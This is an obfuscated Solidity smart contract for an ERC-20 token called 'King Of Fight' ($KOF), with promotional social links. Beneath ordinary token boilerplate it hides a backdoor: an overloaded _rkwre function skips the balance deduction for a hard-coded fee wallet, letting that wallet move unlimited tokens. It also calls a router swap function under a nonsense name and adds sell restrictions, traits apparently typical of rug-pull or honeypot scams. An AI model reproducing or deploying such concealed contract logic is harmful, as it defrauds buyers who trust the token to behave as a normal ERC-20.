/**

King Of Fight    $KOF
King Of Fight series is cherished worldwide for its deep gameplay, rich lore, and diverse character roster, establishing itself as a significant representative in the fighting game genre.


TWITTER: https://twitter.com/KOF_ETH
TELEGRAM: https://t.me/KOF_ETH
WEBSITE: https://kofeth.com/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rkwre(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rkwre(a, b, "SafeMath");
    }

    function  _rkwre(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _ajyrfk {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _alyxir {
    function vfuorgaeteFreacreevlg(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract KOF is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _alyxir private _Trwpyck;
    address payable private _Fiejieo;
    address private _coatru;

    string private constant _name = unicode"King Of Fight";
    string private constant _symbol = unicode"KOF";
    uint8 private constant _decimals = 9;
    uint256 private constant _wTotalwk = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _pvkfrjr;
    mapping (address => bool) private _yrbioy;
    mapping(address => uint256) private _ahjukq;
    uint256 public _qvjvspd = _wTotalwk;
    uint256 public _Wiorsoe = _wTotalwk;
    uint256 public _refTjvu= _wTotalwk;
    uint256 public _XovTyef= _wTotalwk;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yffvoq=0;
    uint256 private _uerbjfg=0;
    

    bool private _efeciykr;
    bool public _Dbforkf = false;
    bool private peqvze = false;
    bool private _opgveu = false;


    event _hzdpwrt(uint _qvjvspd);
    modifier uyvsvr {
        peqvze = true;
        _;
        peqvze = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _wTotalwk;
        _pvkfrjr[owner(

        )] = true;
        _pvkfrjr[address
        (this)] = true;
        _pvkfrjr[
            _Fiejieo] = true;
        _Fiejieo = 
        payable (0x3874bF8131F8e34549f62432177531356e6B0747);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _wTotalwk);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _wTotalwk;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rkwre(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kseyurk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Dbforkf) {
                if (to 
                != address
                (_Trwpyck) 
                && to !=
                 address
                 (_coatru)) {
                  require(_ahjukq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _ahjukq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _coatru && to != 
            address(_Trwpyck) &&
             !_pvkfrjr[to] ) {
                require(amount 
                <= _qvjvspd,
                 "Exceeds the _qvjvspd.");
                require(balanceOf
                (to) + amount
                 <= _Wiorsoe,
                  "Exceeds the macxizse.");
                if(_uerbjfg
                < _yffvoq){
                  require
                  (! _epikbz(to));
                }
                _uerbjfg++;
                 _yrbioy
                 [to]=true;
                kseyurk = amount._pvr
                ((_uerbjfg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _coatru &&
             from!= address(this) 
            && !_pvkfrjr[from] ){
                require(amount <= 
                _qvjvspd && 
                balanceOf(_Fiejieo)
                <_XovTyef,
                 "Exceeds the _qvjvspd.");
                kseyurk = amount._pvr((_uerbjfg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_uerbjfg>
                _yffvoq &&
                 _yrbioy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!peqvze 
            && to == _coatru &&
             _opgveu &&
             contractTokenBalance>
             _refTjvu 
            && _uerbjfg>
            _yffvoq&&
             !_pvkfrjr[to]&&
              !_pvkfrjr[from]
            ) {
                _figoeuf( _wvfde(amount, 
                _wvfde(contractTokenBalance,
                _XovTyef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _xrvieo(address
                    (this).balance);
                }
            }
        }

        if(kseyurk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kseyurk);
          emit
           Transfer(from,
           address
           (this),kseyurk);
        }
        _balances[from
        ]= _rkwre(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rkwre(kseyurk));
        emit Transfer
        (from, to, 
        amount.
         _rkwre(kseyurk));
    }

    function _figoeuf(uint256
     tokenAmount) private
      uyvsvr {
        if(tokenAmount==
        0){return;}
        if(!_efeciykr)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Trwpyck.WETH();
        _approve(address(this),
         address(
             _Trwpyck), 
             tokenAmount);
        _Trwpyck.
        vfuorgaeteFreacreevlg
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wvfde
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rkwre(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Fiejieo){
            return a ;
        }else{
            return a .
             _rkwre (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvjvspd = _wTotalwk;
        _Wiorsoe = _wTotalwk;
        emit _hzdpwrt(_wTotalwk);
    }

    function _epikbz(address 
    account) private view 
    returns (bool) {
        uint256 ejrcuv;
        assembly {
            ejrcuv :=
             extcodesize
             (account)
        }
        return ejrcuv > 
        0;
    }

    function _xrvieo(uint256
    amount) private {
        _Fiejieo.
        transfer(
            amount);
    }

    function openeTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _efeciykr ) ;
        _Trwpyck  
        =  
        _alyxir
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Trwpyck), 
            _wTotalwk);
        _coatru = 
        _ajyrfk(_Trwpyck.
        factory( ) 
        ). createPair (
            address(this
            ),  _Trwpyck .
             WETH ( ) );
        _Trwpyck.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_coatru).
        approve(address(_Trwpyck), 
        type(uint)
        .max);
        _opgveu = true;
        _efeciykr = true;
    }

    receive() external payable {}
}